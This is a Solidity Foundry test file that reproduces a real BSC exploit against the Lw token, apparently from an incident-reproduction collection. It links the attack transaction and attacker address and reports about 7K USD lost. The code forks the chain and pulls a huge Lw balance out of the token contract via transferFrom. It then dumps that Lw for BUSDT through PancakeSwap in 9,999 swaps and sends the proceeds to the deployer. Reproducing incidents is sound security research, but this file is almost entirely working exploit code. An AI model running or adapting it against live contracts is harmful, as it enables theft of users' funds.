pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~7K USD
// TX : https://app.blocksec.com/explorer/tx/bsc/0x96a955304fed48a8fbfb1396ec7658e7dc42b7c140298b80ce4206df34f40e8d
// Attacker : https://bscscan.com/address/0x56b2d55457b31fb4b78ebddd6718ea2667804a06
// Attack Contract : https://bscscan.com/address/0xfe7e9c76affdba7b7442adaca9c7c059ec3092fc
// GUY : https://x.com/0xNickLFranklin/status/1810245893490368820


contract Exploit is Test{
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 Lw = IERC20(0xABC6e5a63689b8542dbDC4b4f39a7e00d4AC30c8);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address Hackcontract;

    function setUp() external {
        cheats.createSelectFork("bsc", 40287544);
        deal(address(BUSDT),address(this),0);
    }

       function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker BUSDT before exploit", BUSDT.balanceOf(address(this)), 18);
        Money Hackcontract=new Money();
        emit log_named_decimal_uint("[End] Attacker BUSDT after exploit", BUSDT.balanceOf(address(this)), 18);

    }

}

contract Money is Test{
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakePair Pair = IPancakePair(0x88fF4f62A75733C0f5afe58672121568a680DE84);
    IERC20 Lw = IERC20(0xABC6e5a63689b8542dbDC4b4f39a7e00d4AC30c8);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    address owner;
    constructor() {
        owner=msg.sender;
        Attack();
    }
    function Attack()public {
        Lw.transferFrom(address(Lw),address(this),1000000000000000000000000000000000);
        uint i =0;
        while(i<9999){
            swap_token_to_token(address(Lw),address(BUSDT),800000000 ether);
            i++;
        }
        BUSDT.transfer(msg.sender,BUSDT.balanceOf(address(this)));
    }
    function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
    
}